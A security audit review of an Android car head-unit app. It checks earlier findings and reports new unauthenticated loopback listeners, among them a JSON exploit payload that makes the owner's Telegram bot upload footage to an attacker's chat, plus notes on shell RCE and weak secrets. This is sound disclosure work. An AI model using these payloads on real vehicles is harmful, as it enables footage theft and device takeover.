# 10 — Independent Review & Verification

*Reviewer pass over the existing audit (docs 01–09), plus a fresh codebase sweep.*
*Audited tree: `main` @ `a6ecca5` (same commit the audit pins).*

This document answers two questions the owner asked:

1. **Is the existing audit accurate?** — I re-derived the load-bearing findings from source rather than trusting the write-ups.
2. **Did a second pass find anything the audit missed?** — Yes: three more unauthenticated loopback listeners, one of which (F21) is a High-severity footage-exfiltration surface. None of them overturns the audit; they *reinforce* its central root cause.

---

## Part 1 — Verification of the existing findings

I independently confirmed each of the high-severity claims against the code at the pinned commit. Every one checks out as written.

| # | Claim | Verified in source | Verdict |
|---|-------|--------------------|---------|
| F1 | Unauth `shell` → RCE on `127.0.0.1:19876` | `TcpCommandServer.java` — `handleClient` reads a line and calls `processCommand` with no token/UID check; `case "shell"` runs `Runtime.exec({"sh","-c",cmd})` | ✅ Accurate |
| F4 | Live camera WebSocket on `0.0.0.0:8887`, zero auth | `WebSocketStreamServer` ctor `super(new InetSocketAddress(PORT))` (wildcard bind); `onOpen` does `clients.add(conn)` then sends SPS/PPS — no handshake token inspection | ✅ Accurate |
| F5 | 8-char (~41-bit) JWT secret, world-readable config | `generateSecret(8)` over a 36-char alphabet, used directly as the HMAC key; `JWT_EXPIRY_MS = 365d` ("effectively indefinite" in-source); config at `/data/local/tmp/overdrive_config.json` set `setReadable/​Writable(true, false)` | ✅ Accurate |
| F6 | `Safe`/`Enc` AES key committed to repo | `generate_safe_enc.py` ships the identical `K1..K4`/IV byte arrays that `Safe.java` reassembles — the decrypt key and the decryptor are in the same public tree | ✅ Accurate |
| F8 | Loopback "safety-net" fail-open | `AuthMiddleware` Tier-2: `if (!hasTunnelHeaders && isLoopback) return true;` — substring match on `SocketAddress.toString()`, exactly as described | ✅ Accurate |
| F17 | `deviceId` leaked pre-auth | `/auth/status` is in `PUBLIC_PATHS`; the file comment literally reads `"/auth/status - leaks deviceId, requires auth"` — the code contradicts its own comment, as the audit flags | ✅ Accurate |
| F2 | Opt-in proxy funnels ProxyHelper clients through a hard-coded VLESS node | `SingboxLauncher.kt` hard-codes `80.225.224.92:443` + uuid/public_key/short_id in plaintext; `ProxyHelper.getHttpProxy()` returns `Proxy.NO_PROXY` when sing-box is down (confirms opt-in) | ✅ Accurate |

I also confirmed the audit's **PR-review corrections are sound**, not hand-waving:

- The proxy really *is* opt-in (`NO_PROXY` when the daemon is off) — the downgrade from "all egress MITM" to "app-scoped, if enabled" is correct.
- The OTA download really does transit HTTPS with default cert validation (`wget`/`curl` + OkHttp), so the earlier "proxy forges the APK" chain was correctly retracted; `pm install -r -d`'s same-signer enforcement is Android's, and the *remaining* gap (silent same-signer **downgrade**, no anti-rollback) is real.
- MQTT config genuinely lives in a **separate** file (`mqtt_connections.json`) that the restore merge never touches — the F10 correction is right.

**Bottom line on Part 1:** this is a high-quality, honest audit. It does not overstate. Where it walked a claim back under review, the walk-back matches the code. The "What is done well" section is also fair — I confirmed the JWT HS256 recompute-and-compare (no `alg:none`), the PBKDF2 PIN, the Telegram single-owner allowlist, and the community shell-action block all exist as described.

---

## Part 2 — What the second pass adds

The audit's binding table (doc 01) lists four listeners: HTTP `:8080`, TCP command `:19876`, video WS `:8887`, surveillance IPC `:19877`. A full sweep for `ServerSocket`/`bind(` finds **three more loopback listeners** the audit does not enumerate. Of these, **one is a live High-severity exfiltration surface (F21), one is a live listener with a lower-value payload (F23), and one is dead code in this build (F22)** — the last two refined after Codex correctly caught that F22's daemon is never started and that F21 allows an attacker-chosen recipient. They share the exact root cause the audit already names — *loopback binding treated as an authorization boundary* — so the live ones extend F1/F9/F16 rather than opening a new class.

### F21 — 🟠 High: Telegram daemon IPC (`127.0.0.1:19880`) exfiltrates footage to an *attacker-chosen* chat, unauth

`TelegramBotDaemon` runs a second server socket on `127.0.0.1:19880` (`handleIpcClient` → `processIpcCommand`) with **no caller authentication**. Any co-resident app (ordinary `INTERNET` permission, same as F1) can connect and issue its commands — `sendMessage`, `sendVideo`, `notifyTunnel`, `notifyMotion`, `notifyCritical`.

> **Correction / severity upgrade (per Codex PR review — verified in source):** my first version claimed "the destination is fixed to `ownerChatId`, so the attacker cannot redirect footage to themselves." **That is wrong.** Both `sendMessage` and `sendVideo` read a **caller-supplied `chatId`** — `long chatId = cmd.optLong("chatId", ownerChatId)` — falling back to the owner *only when the field is omitted*. So a co-resident caller can name **any** destination chat. `sendVideo(chatId, path, caption)` then takes **any daemon-readable file path with no allowlist** and uploads it (files ≤ Telegram's ~50 MB limit; larger ones return a text notice). This is **direct footage/file exfiltration to attacker infrastructure**, not merely owner-alert spoofing — F21 is therefore High, not Low/Medium. Thanks to the reviewer for the catch.

**Exploit (given the preconditions below):**
```json
{"cmd":"sendVideo","chatId":<attacker-chat-id>,"path":"/sdcard/DCIM/BYDCam/event_XXXX.mp4"}
```
→ the owner's own bot uploads the recording straight to the attacker's Telegram. `sendMessage` with an attacker `chatId` similarly lets the attacker read nothing but *send* arbitrary text from the bot to any chat.

**Preconditions:** Telegram must be configured (a `botToken` is present) and, for `sendVideo`, **video uploads enabled** (`videoUploadsEnabled` gate) and the message category enabled for `sendMessage`. These are common configurations for anyone using the Telegram integration — the whole point of which is footage-to-Telegram — so the precondition is not much of a barrier for the target population. It composes with F12 (world-readable footage on `/sdcard`) and F13 (fake alerts during pairing).

The audit's Telegram doc (07) analyses only the *inbound* long-poll owner gate; this *outbound* local IPC — and its arbitrary-recipient exfiltration — is not covered there.

### F22 — 🟡 Low (dormant in the audited build): BYD event daemon telemetry (`127.0.0.1:19878`), unauth *if launched*

`BydEventDaemon` *contains* a loopback listener on `127.0.0.1:19878` that answers `ping`/`status`/`getRadar`/`getBattery` with no auth (read-only; no setters in the command table).

> **Correction (per Codex PR review — verified):** in the audited runtime this daemon is **not started**, so the `:19878` listener is not actually exposed on a normal install. The only launch paths are stubbed out: `BydSystemManager.startEventSystem()` has the `startBydEventDaemon()` call **commented out** and logs *"BydEventDaemon start skipped (PrivilegedShellSetup disabled)"*, and `DaemonManager.startBydEventDaemon()` is a no-op that only records state. `SentryEventHandler`/`BydEventClient` are *clients* that would fail to connect. So this is **dead code in this build**, reachable only if some external/manual launcher starts the daemon. Recorded as a latent surface to fix if it is ever re-enabled — not a live exposure today. Thanks to the reviewer for catching this.

### F23 — 🟡 Low: AAC audio-ingest listener (`127.0.0.1`), unauth — plus a latent (not live) port-number clash

`AacIngestServer` is loopback-bound with no caller auth (doc 02 acknowledges the "audio-ingest IPC" in passing but does not score it) — this one **is** launched, so it is a live unauth loopback surface, though its payload is an audio stream rather than a command set.

> **Correction (per Codex PR review — verified):** I originally called the shared port number a "probable runtime collision." That overstates it. `AacIngestServer.PORT` and `BydEventDaemon.TCP_PORT` are **both `19878`**, but because `BydEventDaemon` is not started (F22), `AacIngestServer` binds `19878` cleanly — there is **no live collision** in the audited build. (The codebase already recognised the clash and moved the *TelegramBot* IPC off `19878` to `19880` — see the comment at `TelegramBotDaemon.java`.) So this is a **latent config smell** — a duplicated port constant that would collide only if the dormant daemon is re-enabled — not a current reliability bug. The listener inventory would still benefit from a single documented port registry.

---

## Part 3 — Direct answer to the owner's concern

> *"I'm concerned about handing over so much deep control of my vehicle."*

That concern is **well-founded, and the audit quantifies it correctly.** The app does hold the full `BYDAUTO_*` HAL permission set (door locks, drivetrain, ADAS, charging — visible in the manifest), and it exposes that power through channels that, in several cases, trust *position* (on the head unit, on the LAN, on the broker) instead of *identity*.

The single most important structural fact — mine and the audit's conclusion both land here — is:

> **The app repeatedly treats "reached me over loopback / the LAN / a shared broker" as "authorized."**

Every Critical/High in the audit, plus my three additions, is an instance of that one mistake. It is *fixable* (positive authentication on each channel, a non-world-readable secret store, TLS, signed updates/backups) and the audit's per-doc recommendations are the right fixes — but until they land, the honest summary for an owner deciding whether to run this is:

- **Lowest-exposure posture:** do **not** enable the sing-box proxy, MQTT control, or any tunnel (zrok/cloudflared); keep the head unit off untrusted Wi-Fi. That removes F2, F7, F14 (remote), and F19 from your threat model entirely — they are all opt-in.
- **Irreducible residual risk** even with everything off: any *co-resident app or ADB-context process* on the head unit can reach the unauthenticated loopback surfaces (F1 shell-RCE, F9 surveillance IPC, F21 footage exfiltration to an attacker-chosen Telegram chat when the Telegram integration is on, plus F5/F6/F16 secret exposure). If you trust everything installed on the unit and don't sideload, this is contained; if the unit runs untrusted apps, it is not.
- **Non-negotiable if any secret has ever shipped or been exported:** rotate them (doc 09 §recommendation 4). The committed `Safe`/`Enc` key is already public; treat anything it "protected" as public too.

None of this requires trusting the maintainer to be *malicious* — the proxy-operator question (doc 03) is worth resolving with the OSINT commands there — but most of the risk is structural, independent of intent, and reachable by third parties the maintainer doesn't control either.
